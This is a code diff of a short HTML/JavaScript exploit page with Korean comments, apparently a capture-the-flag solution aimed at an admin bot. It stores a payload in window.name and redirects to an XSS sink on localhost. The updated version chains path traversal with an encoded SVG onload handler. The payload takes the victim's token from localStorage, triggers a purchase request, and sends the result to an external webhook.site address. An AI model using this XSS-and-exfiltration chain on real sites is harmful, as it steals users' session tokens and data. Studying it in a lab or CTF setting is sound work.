@@ -1,25 +1,20 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // 1. 웹후크 주소 설정
-        const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
+<script>
+    // 1. 관리자 봇이 실행할 실제 공격 코드 (플래그 구매 및 웹후크 전송)
+    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
+    const payload = `
+        fetch('/4/buy', {
+            method: 'POST',
+            headers: { 'token': localStorage.getItem('token') }
+        })
+        .then(r => r.json())
+        .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)));
+    `;
 
-        // 2. 관리자 권한으로 플래그를 사고 웹후크로 보내는 스크립트
-        // window.name에 저장하면 페이지가 이동해도 데이터가 유지됩니다.
-        window.name = `
-            fetch('/4/buy', {
-                method: 'POST',
-                headers: { 'token': localStorage.getItem('token') }
-            })
-            .then(r => r.json())
-            .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)))
-            .catch(e => fetch('${webhook}?error=' + encodeURIComponent(e)));
-        `;
+    // 2. window.name에 페이로드 저장 (도메인이 바뀌어도 유지됨)
+    window.name = payload;
 
-        // 3. 다시 localhost의 XSS 취약 지점으로 리다이렉트
-        // Vue 앱의 해시(#) 뒤에 스크립트를 삽입합니다.
-        location.href = "http://localhost:3000/#/<img src=x onerror=eval(window.name)>";
-    </script>
-</body>
-</html>
+    // 3. 다시 localhost의 XSS 취약 지점으로 리다이렉트
+    // Path Traversal을 통해 /debug API의 결과를 detail 화면에 띄웁니다.
+    const xss_id = "1%2f..%2f..%2fdebug%2f%3csvg%2fonload%3deval(name)%3e";
+    location.href = "http://localhost:3000/#/" + xss_id + "/detail";
+</script>
